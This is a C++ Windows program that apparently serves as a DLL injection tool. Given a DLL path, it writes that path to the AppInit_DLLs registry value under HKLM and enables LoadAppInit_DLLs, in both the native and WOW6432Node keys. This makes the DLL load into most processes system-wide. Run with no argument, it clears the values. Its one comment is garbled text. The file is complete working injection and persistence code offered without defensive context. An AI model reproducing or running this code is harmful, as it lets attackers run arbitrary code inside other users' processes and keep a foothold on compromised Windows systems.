#include <iostream>
#include <windows.h>

using namespace std;

void RegDllIjHandle(WCHAR subKey[], WCHAR AppInit_DLLs[], DWORD LoadAppInit_DLLs)
{
	HKEY key;
	LSTATUS ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, KEY_ALL_ACCESS, &key);
	if (ret != ERROR_SUCCESS)
	{
		cout << "open key failed..." << endl;
		return;
	}

	ret = RegSetValueEx(key, L"AppInit_DLLs", 0, REG_SZ, (const BYTE*)AppInit_DLLs, ((wcslen(AppInit_DLLs) + 1) * sizeof(WCHAR)));
	if (ret != ERROR_SUCCESS)
	{
		cout << "set AppInit_DLLs failed..." << endl;
		return;
	}

	ret = RegSetValueEx(key, L"LoadAppInit_DLLs", 0, REG_DWORD, (const BYTE*)&LoadAppInit_DLLs, sizeof(DWORD));
	if (ret != ERROR_SUCCESS)
	{
		cout << "set LoadAppInit_DLLs failed..." << endl;
		return;
	}

	RegCloseKey(key);
}

void RegDllIj(WCHAR AppInit_DLLs[], DWORD LoadAppInit_DLLs)
{
	WCHAR subKeyX64[] = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
	WCHAR subKeyX86[] = L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
	RegDllIjHandle(subKeyX64, AppInit_DLLs, LoadAppInit_DLLs);
	RegDllIjHandle(subKeyX86, AppInit_DLLs, LoadAppInit_DLLs);
}

int main(int argc, char* argv[])
{
	WCHAR AppInit_DLLs[MAX_PATH] = L"";
	if (argc == 2)
	{
		swprintf(AppInit_DLLs, MAX_PATH, L"%hs", argv[1]);
		RegDllIj(AppInit_DLLs, 1);
		cout << "ij success" << endl;
	}
	else {
		// »Ö¸´×¢²á±í
		RegDllIj(AppInit_DLLs, 0);
		cout << "re success" << endl;
	}

	return 0;
}